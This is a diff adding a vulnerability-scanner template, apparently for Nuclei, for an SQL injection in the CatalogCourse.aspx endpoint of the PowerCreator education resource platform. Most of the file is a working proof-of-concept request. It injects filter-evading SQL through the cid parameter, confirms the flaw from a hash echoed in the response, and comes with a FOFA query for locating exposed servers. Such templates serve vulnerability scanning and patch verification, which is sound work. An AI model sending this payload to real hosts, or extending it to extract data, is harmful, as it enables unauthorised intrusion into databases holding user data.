@@ -1,0 +1,26 @@
+id: powercreator-catalogcourse-sql
+
+info:
+  name: "PowerCreator 教育资源管理平台 CatalogCourse.aspx 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="PowerCreator-CMS"
+          PowerCreator 教育资源管理平台的 CatalogCourse.aspx 接口存在 SQL 注入安全缺陷。攻击者可通过构造恶意输入执行SQL注入攻击，从而泄露数据库中的敏感信息或操控服务器数据。
+  tags: PowerCreator
+
+http:
+- raw:
+  - |
+    GET /CatalogCourse.aspx?cid=1%0Cand%0C1=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Cookie: ASP.NET_SessionId=l2wuj2tri5e554020jeezoyw; language=simpleChineses
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '59abbe56'
